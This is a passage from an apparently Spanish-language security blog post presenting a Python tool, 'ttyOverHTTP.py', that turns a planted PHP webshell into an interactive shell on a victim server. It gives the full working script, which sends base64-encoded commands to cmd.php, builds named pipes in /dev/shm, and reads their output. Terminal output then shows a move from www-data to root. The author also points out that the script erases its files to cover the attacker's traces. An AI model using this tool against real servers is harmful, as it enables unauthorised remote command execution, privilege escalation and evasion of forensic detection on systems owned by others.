<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">whoami</span>
<span class="n">k4lelv</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">sudo</span> <span class="n">su</span>
<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">k4lelv</span><span class="o">:</span> 
<span class="err">┌─</span><span class="p">[</span><span class="n">root</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">#</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span>
</code></pre></div></div>

<p>El único problema es que el fichero <code class="language-plaintext highlighter-rouge">output</code> va almacenando el resultado de los comandos anteriormente ejecutados desde consola introducidos en <code class="language-plaintext highlighter-rouge">input</code>, por lo que por cada vez que abramos el <code class="language-plaintext highlighter-rouge">output</code>, veremos este histórico.</p>

<p>Aún así, está todo pensado… no os preocupéis. ¿Cuál es la idea ahora?, pues aprovechar este principio para construir una utilidad en Python la cual nos permita comunicarnos, mediante la webshell previamente creada, con estos ficheritos <code class="language-plaintext highlighter-rouge">input</code> y <code class="language-plaintext highlighter-rouge">output</code> depositados sobre el sistema víctima explotando para ello la utilidad <code class="language-plaintext highlighter-rouge">mkfifo</code>.</p>

<p>Haríamos uso de la siguiente utilidad en Python3:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">threading</span><span class="p">,</span> <span class="n">pdb</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randrange</span>

<span class="k">class</span> <span class="nc">AllTheReads</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">interval</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
		<span class="bp">self</span><span class="o">.</span><span class="n">interval</span> <span class="o">=</span> <span class="n">interval</span>
		<span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">run</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">())</span>
		<span class="n">thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
		<span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

	<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="n">readoutput</span> <span class="o">=</span> <span class="s">"""/bin/cat </span><span class="si">%</span><span class="s">s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
		<span class="n">clearoutput</span> <span class="o">=</span> <span class="s">"""echo '' &gt; </span><span class="si">%</span><span class="s">s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
		<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
			<span class="n">output</span> <span class="o">=</span> <span class="n">RunCmd</span><span class="p">(</span><span class="n">readoutput</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">output</span><span class="p">:</span>
				<span class="n">RunCmd</span><span class="p">(</span><span class="n">clearoutput</span><span class="p">)</span>
				<span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
			<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">interval</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">RunCmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
	<span class="n">cmd</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
	<span class="n">cmd</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        	<span class="s">'cmd'</span> <span class="p">:</span> <span class="s">'echo "</span><span class="si">%</span><span class="s">s" | base64 -d | sh'</span> <span class="o">%</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
		<span class="p">}</span>
	<span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://127.0.0.1/cmd.php'</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
	<span class="k">return</span> <span class="n">result</span>

<span class="k">def</span> <span class="nf">WriteCmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
	<span class="n">cmd</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
	<span class="n">cmd</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s">'cmd'</span> <span class="p">:</span> <span class="s">'echo "</span><span class="si">%</span><span class="s">s" | base64 -d &gt; </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://127.0.0.1/cmd.php'</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
	<span class="k">return</span> <span class="n">result</span>

<span class="k">def</span> <span class="nf">ReadCmd</span><span class="p">():</span>
        <span class="n">GetOutput</span> <span class="o">=</span> <span class="s">"""/bin/cat </span><span class="si">%</span><span class="s">s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">RunCmd</span><span class="p">(</span><span class="n">GetOutput</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">output</span>

<span class="k">def</span> <span class="nf">SetupShell</span><span class="p">():</span>
	<span class="n">NamedPipes</span> <span class="o">=</span> <span class="s">"""mkfifo </span><span class="si">%</span><span class="s">s; tail -f </span><span class="si">%</span><span class="s">s | /bin/sh 2&gt;&amp;1 &gt; </span><span class="si">%</span><span class="s">s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">)</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">RunCmd</span><span class="p">(</span><span class="n">NamedPipes</span><span class="p">)</span>
	<span class="k">except</span><span class="p">:</span>
		<span class="bp">None</span>
	<span class="k">return</span> <span class="bp">None</span>

<span class="k">global</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span>
<span class="n">session</span> <span class="o">=</span> <span class="n">randrange</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
<span class="n">stdin</span> <span class="o">=</span> <span class="s">"/dev/shm/input.</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">session</span><span class="p">)</span>
<span class="n">stdout</span> <span class="o">=</span> <span class="s">"/dev/shm/output.</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">session</span><span class="p">)</span>
<span class="n">erasestdin</span> <span class="o">=</span> <span class="s">"""/bin/rm </span><span class="si">%</span><span class="s">s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdin</span><span class="p">)</span>
<span class="n">erasestdout</span> <span class="o">=</span> <span class="s">"""/bin/rm </span><span class="si">%</span><span class="s">s"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span>

<span class="n">SetupShell</span><span class="p">()</span>

<span class="n">ReadingTheThings</span> <span class="o">=</span> <span class="n">AllTheReads</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">sig_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[*] Exiting...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"[*] Removing files...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">RunCmd</span><span class="p">(</span><span class="n">erasestdin</span><span class="p">)</span>
	<span class="n">RunCmd</span><span class="p">(</span><span class="n">erasestdout</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"[*] All files have been deleted</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
	<span class="n">WriteCmd</span><span class="p">(</span><span class="n">cmd</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">1.1</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li><strong>Importante</strong>: En este caso estamos tirando contra la <code class="language-plaintext highlighter-rouge">127.0.0.1</code> suponiendo que el fichero se llama <code class="language-plaintext highlighter-rouge">cmd.php</code>, en vuestro caso lo tendréis que cambiar a lo que os toque.</li>
</ul>

<p>Entonces bien, imaginad que ya tenéis un archivo <code class="language-plaintext highlighter-rouge">cmd.php</code> alojado en el servidor víctima, pues mirad que sencillo:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">python3</span> <span class="n">ttyOverHTTP</span><span class="o">.</span><span class="n">py</span> 
<span class="o">&gt;</span> <span class="n">whoami</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span>
<span class="o">&gt;</span> <span class="n">pwd</span>
<span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span>
<span class="o">&gt;</span> <span class="n">cd</span> <span class="o">/</span><span class="n">home</span>
<span class="o">&gt;</span> <span class="n">pwd</span>
<span class="o">/</span><span class="n">home</span>
<span class="o">&gt;</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
<span class="n">total</span> <span class="m">0</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="m">1</span> <span class="n">k4lelv</span> <span class="n">k4lelv</span> <span class="m">1156</span> <span class="n">Feb</span>  <span class="m">4</span> <span class="m">12</span><span class="o">:</span><span class="m">19</span> <span class="n">k4lelv</span>
</code></pre></div></div>

<p>Ya directamente se gestiona desde el script la sesión, pudiendo así ver los outputs de los comandos que especifiquemos desde <code class="language-plaintext highlighter-rouge">input</code>.</p>

<p>El procedimiento ahora para obtener una TTY y proseguir naturalmente sería el mismo que os mostré anteriormente:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">python3</span> <span class="n">ttyOverHTTP</span><span class="o">.</span><span class="n">py</span> 
<span class="o">&gt;</span> <span class="n">whoami</span>                  
<span class="n">www</span><span class="o">-</span><span class="n">data</span>
<span class="o">&gt;</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">file</span> <span class="n">is</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">parrot</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="err">$</span>
<span class="o">&gt;</span> <span class="n">su</span> <span class="n">k4lelv</span>
<span class="n">su</span> <span class="n">k4lelv</span>
<span class="n">Password</span><span class="o">:</span>
<span class="o">&gt;</span> <span class="o">*************</span> <span class="err">#</span> <span class="n">Aquí</span> <span class="n">va</span> <span class="n">vuestra</span> <span class="n">contraseña</span>

<span class="err">░▒▓</span> <span class="err"></span> <span class="err"></span> <span class="err"></span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">w</span><span class="o">/</span><span class="n">html</span> <span class="err"></span> <span class="err">✔</span> <span class="err">▓▒░</span>                                                  
<span class="o">&gt;</span> <span class="n">bash</span>
<span class="n">bash</span>
<span class="err">┌──</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span>
<span class="o">&gt;</span> <span class="n">whoami</span>
<span class="n">whoami</span>
<span class="n">k4lelv</span>
<span class="err">┌──</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span>
<span class="o">&gt;</span> <span class="n">sudo</span> <span class="n">su</span>
<span class="n">sudo</span> <span class="n">su</span>
<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">k4lelv</span><span class="o">:</span>
<span class="o">&gt;</span> <span class="o">***********</span> <span class="err">#</span> <span class="n">Aquí</span> <span class="n">va</span> <span class="n">vuestra</span> <span class="n">contraseña</span>

<span class="err">░▒▓</span> <span class="err"></span> <span class="err"></span> <span class="err"></span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">w</span><span class="o">/</span><span class="n">html</span> <span class="err"></span> <span class="err">✔</span> <span class="err"></span> <span class="err"></span> <span class="err">▓▒░</span>                                                
<span class="n">bash</span>
<span class="n">bash</span>
<span class="err">┌──</span><span class="p">[</span><span class="n">root</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">#</span>
<span class="o">&gt;</span> <span class="n">whoami</span>
<span class="n">whoami</span>
<span class="n">root</span>
<span class="err">┌──</span><span class="p">[</span><span class="n">root</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">#</span>
<span class="o">&gt;</span> 
</code></pre></div></div>

<p>Como podréis comprobar, tenemos una TTY completamente interactiva, pudiendo hacer todo lo que haríamos desde consola pero gestionado todo a través de una webshell. Y cómo no… no nos hemos entablado una Reverse Shell, buena esa.</p>

<p>Si presionáis la tecla <code class="language-plaintext highlighter-rouge">Ctrl+C</code>, se eliminarán todos los ficheros temporales del sistema víctima creados para gestionar la sesión, limpiando así el rastro que como atacantes estamos dejando bajo la ruta <code class="language-plaintext highlighter-rouge">/dev/shm/</code>.</p>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#herramientas" class="page__taxonomy-item" rel="tag">Herramientas</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#web-exploiting" class="page__taxonomy-item" rel="tag">Web Exploiting</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#scripting" class="page__taxonomy-item" rel="tag">Scripting</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#utilidades" class="page__taxonomy-item" rel="tag">Utilidades</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2020-02-04T00:00:00+00:00">February 04, 2020</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/oswp-preparacion/" class="pagination--pager" title="Preparación OSWP
">Previous</a>
    
    
      <a href="/falsificacion-mensajes-whatsapp/" class="pagination--pager" title="Falsificación de mensajes en WhatsApp
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2020 k4lelv</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
